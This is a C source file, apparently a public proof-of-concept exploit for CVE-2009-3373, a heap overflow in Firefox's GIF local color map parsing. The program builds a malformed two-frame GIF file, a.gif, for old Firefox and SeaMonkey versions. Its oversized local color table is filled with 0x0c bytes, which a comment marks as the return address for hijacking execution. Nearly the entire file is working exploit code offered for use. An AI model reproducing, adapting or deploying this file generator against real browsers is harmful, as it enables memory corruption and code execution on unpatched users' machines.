#include <stdio.h>
#include <stdlib.h>

/*
	x90c local color map 1day exploit

    CVE-2009-3373 Firefox local color map 1day exploit
    (MFSA 2009-56 Firefox local color map parsing heap overflow)
    Full Exploit: http://www.exploit-db.com/sploits/27699.tgz
    

vulnerable:
    - Firefox 3.5.4 <=
    - Firefox 3.0.15 <=
    - SeaMonkey 2.0 <=


    x90c
*/

struct _IMAGE
{
    char GCT_size;          // global color map size
    char Background;        // backcolor( select in global color map entry )
    char default_pixel_ratio;   // 00 
    char gct[4][3];         // 4 entries of global color map( 1bit/1pixel )
//    char app_ext[19];     // application extension 19bytes ( to enable animation )
    char gce[2];            // '!' GCE Label = F9
    char ext_data;          // 04 = 4 bytes of extension data
    char trans_color_ind;   // use transparent color? ( 0/1 )
    char ani_delay[2];      // 00 00 ( micro seconds delay in animation )
    char trans;             // color map entry to apply transparent color ( applied first image )
    char terminator1;       // 0x00
    char image_desc;        // ','
    char NW_corner[4];      // 00 00 00 00 (0, 0) image put position
    char canvas_size[4];    // 03 00 05 00 ( 3x5 ) logical canvas size
    char local_colormap;    // 80 use local color map? ( last bottom 3bits are bits per pixel)
    char lct[4][3];         // local color map ( table )
    char LZW_min;           // 02   ( LZW data length -1 )
    char encoded_image_size;// 03   ( LZW data length )
    char image_data[1];     // LZW encoded image data
    char terminator2;       // 0x00

} IMAGE;

struct _IMAGE1
{
    char image_desc;        // ','
    char NW_corner[4];      // 00 00 00 00 (0, 0)
    char canvas_size[4];    // 03 00 05 00 ( 3x5 )
    char local_colormap;    // 00 = no local color map
    char lct[7][3];         // local color map        
    char lcta[1][2];    
//    char LZW_min;           // 08
//    char encoded_image_size;    // 0B ( 11 bytes )
//    char image_data[9];    // encoded image data
    //char terminator2;    // 0x00
} IMAGE1;


struct _GIF_HEADER
{
    char MAGIC[6];  // GIF89a
    unsigned short canvas_width;    // 03 00
    unsigned short canvas_height;   // 05 00
    struct _IMAGE image;
    struct _IMAGE1 image1;
   // char trailler;  // ;      // GIF file trailer
} GIF_HEADER;

int main(int argc, char *argv[])
{
    struct _GIF_HEADER  gif_header;
    int i = 0;
	// (1) first image frame to LZW data, proper dummy ( it's can't put graphic )
//    char data[3] = "\x84\x8F\x59";        
    char data[3] = "\x00\x00\x00";
	// (2) second image frame to LZW data, backcolor changed by reference local color map
    char data1[9] = "\x84\x8F\x59\x84\x8F\x59\x84\x8F\x59";       
    char app_ext[19] = "\x21\xFF\x0B\x4E\x45\x54\x53\x43\x41\x50\x45\x32\x2E\x30\x03\x01\x00\x00\x00";  // animation tag ( not use )
    FILE *fp;

    memset(&gif_header, 0, sizeof(gif_header));

    // MAGIC    ( GIF87a ) last version - support alpha value(transparency)
    gif_header.MAGIC[0] = '\x47';
    gif_header.MAGIC[1] = '\x49';
    gif_header.MAGIC[2] = '\x46';
    gif_header.MAGIC[3] = '\x38';
    gif_header.MAGIC[4] = '\x39';
    gif_header.MAGIC[5] = '\x61';

    // LOGICAL CANVAS
    gif_header.canvas_width = 3;        // global canvas width length
    gif_header.canvas_height = 5;       // height length

    // GLOBAL HEADER ( included global header, if local color map exists, not used global color map )
     gif_header.image.GCT_size = '\x81';    // 81
     gif_header.image.Background = '\x00';   // global color table #2 ( black )
     gif_header.image.default_pixel_ratio = '\x00';        // 00 ( Default pixel aspect ratio )
    // gct ( [200][3] )
        
    gif_header.image.gct[0][0] = '\x43';
    gif_header.image.gct[0][1] = '\x43';
    gif_header.image.gct[0][2] = '\x43';

    gif_header.image.gct[1][0] = '\x43';
    gif_header.image.gct[1][1] = '\x43';
    gif_header.image.gct[1][2] = '\x43';

    gif_header.image.gct[2][0] = '\x43';
    gif_header.image.gct[2][1] = '\x43';
    gif_header.image.gct[2][2] = '\x43';
    
    gif_header.image.gct[3][0] = '\x43';
    gif_header.image.gct[3][1] = '\x43';
    gif_header.image.gct[3][2] = '\x43';

   /* for(i = 0; i < 19; i++)
    {
        gif_header.image.app_ext[i] = app_ext[i];
    }*/

    gif_header.image.gce[0] = '!';
    gif_header.image.gce[1] = '\xF9';
    gif_header.image.ext_data = '\x04';
    gif_header.image.trans_color_ind = '\x00';  // no use transparent color
    gif_header.image.ani_delay[0] = '\x00'; // C8 = 2 seconds delay ( animation )
    gif_header.image.ani_delay[1] = '\x00';
    gif_header.image.trans = '\x00';            // no use transparent color ( color map )
    gif_header.image.terminator1 = '\x00';

    // IMAGE Header
    gif_header.image.image_desc = ',';
    gif_header.image.NW_corner[0] = '\x00';     // 0,0 position
    gif_header.image.NW_corner[1] = '\x00';
    gif_header.image.NW_corner[2] = '\x00';
    gif_header.image.NW_corner[3] = '\x00';
    gif_header.image.canvas_size[0] = '\x03';   // 3 x 5 canvas
    gif_header.image.canvas_size[1] = '\x00';
    gif_header.image.canvas_size[2] = '\x05';
    gif_header.image.canvas_size[3] = '\x00';
    

    gif_header.image.local_colormap = 0x80;    // use local color map
//    gif_header.image.local_colormap |= 0x40;    // image formatted in Interlaced order
    //gif_header.image.local_colormap |= 0x4;     // pixel of local color map
    //gif_header.image.local_colormap |= 0x2; // 2 bits.
    gif_header.image.local_colormap |= 0x1; // bits per pixel. ( black/white )
    gif_header.image.lct[0][0] = '\x42';    // R ( red )
    gif_header.image.lct[0][1] = '\x42';
    gif_header.image.lct[0][2] = '\x42';
    gif_header.image.lct[1][0] = '\x42';
    gif_header.image.lct[1][1] = '\x42';    // G ( green )
    gif_header.image.lct[1][2] = '\x42';    // b ( blue ) 
    gif_header.image.lct[2][0] = '\x42';
    gif_header.image.lct[2][1] = '\x42';
    gif_header.image.lct[2][2] = '\x42';
    gif_header.image.lct[3][0] = '\x42';
    gif_header.image.lct[3][1] = '\x42';
    gif_header.image.lct[3][2] = '\x42';

    // RASTER DATA
    gif_header.image.LZW_min = '\x00';  // total encode data - 1
    gif_header.image.encoded_image_size = '\x01';   // 255 bytes
    // encoded data
    for(i = 0; i < 1; i++)
    {
        gif_header.image.image_data[i] = 0xFF;
    }

    // RASTER DATA EOF
    gif_header.image.terminator2 = '\x00';

    // --------------------------------------------------
    
    // ------------- IMAGE1 -----------------------------
    gif_header.image1.image_desc = ',';
    gif_header.image1.NW_corner[0] = '\x00';    // (0, 0)
    gif_header.image1.NW_corner[1] = '\x00';
    gif_header.image1.NW_corner[2] = '\x00';
    gif_header.image1.NW_corner[3] = '\x00';
    gif_header.image1.canvas_size[0] = '\x03';  // 3 x 5
    gif_header.image1.canvas_size[1] = '\x00';
    gif_header.image1.canvas_size[2] = '\x05';
    gif_header.image1.canvas_size[3] = '\x00';
    gif_header.image1.local_colormap = 0x80;    // use local color map
//    gif_header.image1.local_colormap |= 0x40;    // image formatted in Interlaced order
    //gif_header.image1.local_colormap |= 0x4;     // pixel of local color map 4 pixel
    gif_header.image1.local_colormap |= 0x2; 
    //gif_header.image1.local_colormap |= 0x1;    // 1bit per pixel.

    // below values are will used as return addr
    for(i = 0; i < 7; i++)       // second image frame's local color map entry length is 8
    {
        gif_header.image1.lct[i][0] = '\x0c';   // (RET & 0x00FF0000)
        gif_header.image1.lct[i][1] = '\x0c';   // (RET & 0xFF00FF00)
        gif_header.image1.lct[i][2] = '\x0c';   // (RET & 0X000000FF)
    }
    gif_header.image1.lcta[0][0] = '\x0c';
    gif_header.image1.lcta[0][1] = '\x0c';
    //}

   
    // RASTER DATA
    //gif_header.image1.LZW_min = 0x00;//'\x05';
    //gif_header.image1.encoded_image_size = 0x00;//'\x06';*/

    // encoded data
/*    for(i = 0; i < 9; i++)
    {
        gif_header.image1.image_data[i] = 0xFF;//data1[i];
    }*/

    // RASTER DATA
    // second image frame's last byte ignored ( null terminatee, GIF total trailer )
    //gif_header.image1.terminator2 = '\x00';

    //gif_header.trailler = ';';


    // --------------------------------------------------

    fp = fopen("a.gif", "wb");

    printf("%d\n", sizeof(struct _GIF_HEADER));

    fwrite(&gif_header, sizeof(struct _GIF_HEADER) - 1, 1, fp);

    fclose(fp);

    system("xxd ./a.gif");

}